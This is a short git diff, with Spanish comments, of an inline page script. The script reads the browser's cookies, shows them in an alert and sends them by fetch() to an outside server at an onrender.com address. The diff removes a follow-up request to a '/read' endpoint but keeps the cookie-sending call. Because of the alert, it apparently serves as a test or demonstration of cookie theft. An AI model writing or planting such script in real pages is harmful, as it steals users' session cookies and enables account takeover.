@@ -11,18 +11,9 @@
         const cookies = document.cookie;
         alert("Cookies obtenidas: " + cookies);
 
-        // Enviar las cookies al servidor de render
+        // Enviar las cookies al servidor
         fetch(`https://testnode-knt5.onrender.com/cookies?cookies=${cookies}`, { 
-            method: 'GET',
-        })
-        .then(response => response.text()) 
-        .then(data => {
-            console.log('Respuesta del servidor:', data); 
-
-
-            return fetch(`https://testnode-knt5.onrender.com/read`, {
-                method: 'GET',
-            });
+            method: 'GET',  
         })
 
     </script>
